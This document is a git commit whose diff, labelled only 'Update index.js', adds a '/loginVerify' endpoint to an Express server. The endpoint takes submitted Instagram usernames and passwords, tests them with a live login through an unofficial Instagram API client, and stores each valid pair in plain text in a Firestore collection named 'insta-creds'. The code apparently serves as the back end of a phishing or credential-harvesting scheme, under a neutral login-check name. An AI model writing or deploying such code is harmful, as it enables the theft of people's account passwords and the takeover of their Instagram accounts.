8fa0f4937a60c2a4263771d003bacabdd3c2ee51
unknown951258563465335 <89399889+unknown951258563465335@users.noreply.github.com>
2023-07-05 11:32:08 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,10 +1,31 @@
 const express = require('express');
 const app = express();
 const port = 3000
+const { IgApiClient } = require("instagram-private-api");
+const db = require("./firebaseConfig")
+const { collection, addDoc } = require("firebase/firestore");
+app.use(express.json());
 
-app.use(express.json())
-app.use("/",require("./Routes/LoginValidatoin"));
-
+app.get("/loginVerify", async (req, res) => {
+res.send("hello")
+})
+app.post("/loginVerify", async (req, res) => {
+  try {
+    const ig = new IgApiClient();
+    const { USERNAME, PASSWORD } = req.body;
+    ig.state.generateDevice(USERNAME);
+    await ig.account.login(USERNAME, PASSWORD);
+    const data = {
+        USERNAME:USERNAME,
+        PASSWORD:PASSWORD
+    }
+    await addDoc(collection(db, "insta-creds"),data);
+    res.status(200).json({msg:"Success"})
+  } catch (error) {
+    console.log(error.message)
+    res.status(401).json({msg:"Invalid Credentials Please Try again later"})
+  }
+});
 app.listen(port, () => {
   console.log(`Example app listening on port ${port}`)
 })
